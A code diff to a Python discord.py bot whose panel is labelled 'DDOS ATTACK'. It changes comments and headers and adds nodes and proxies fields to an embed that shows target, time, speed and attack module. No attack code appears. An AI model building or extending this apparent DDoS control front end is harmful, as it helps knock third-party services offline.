@@ -64,7 +64,7 @@ class DeviceRequestButton(discord.ui.Button):
             label="ขอ Device",
             style=discord.ButtonStyle.secondary,
             custom_id="device_request",
-            emoji=EMOJI_PICK,   # discord.py parse string ให้เอง
+            emoji=EMOJI_PICK,
         )
         self.allowed_user_id = allowed_user_id
 
@@ -105,7 +105,6 @@ class ModuleSelect(discord.ui.Select):
             )
             return
 
-        # เคลียร์ view ผ่าน HTTP API — ไม่กิน interaction response
         try:
             await interaction.message.edit(view=None)
         except discord.HTTPException:
@@ -124,7 +123,7 @@ class ModuleView(discord.ui.View):
 
 
 # ============================================================
-# Attack panel
+# Attack panel (persistent)
 # ============================================================
 class AttackPanel(discord.ui.View):
     def __init__(self, allowed_user_id: int):
@@ -132,7 +131,9 @@ class AttackPanel(discord.ui.View):
         self.add_item(DeviceRequestButton(allowed_user_id))
 
 
-# ── embeds ──
+# ============================================================
+# Embeds
+# ============================================================
 def build_attack_embed(with_image: bool = True) -> discord.Embed:
     em = discord.Embed(
         title=f"{EMOJI_DDOS_HEADER} DDOS ATTACK",
@@ -172,6 +173,8 @@ def build_module_embed() -> discord.Embed:
 
 def build_attack_running_embed(target: str, time_left: int,
                                speed: str, module: str,
+                               nodes: str = "-",
+                               proxies: str = "0",
                                with_image: bool = True) -> discord.Embed:
     em = discord.Embed(
         title=f"{EMOJI_PICK} DDOS ATTACK",
@@ -180,6 +183,8 @@ def build_attack_running_embed(target: str, time_left: int,
             f"**IP:URL TERGET:** `{target}`\n"
             f"**TIME:** `{time_left}s`\n"
             f"**SPEED WEB:** `{speed}`\n"
+            f"**NODES:** `{nodes}`\n"
+            f"**PROXIES:** `{proxies}`\n"
             f"**MODULE:** `{module}`"
         ),
     )
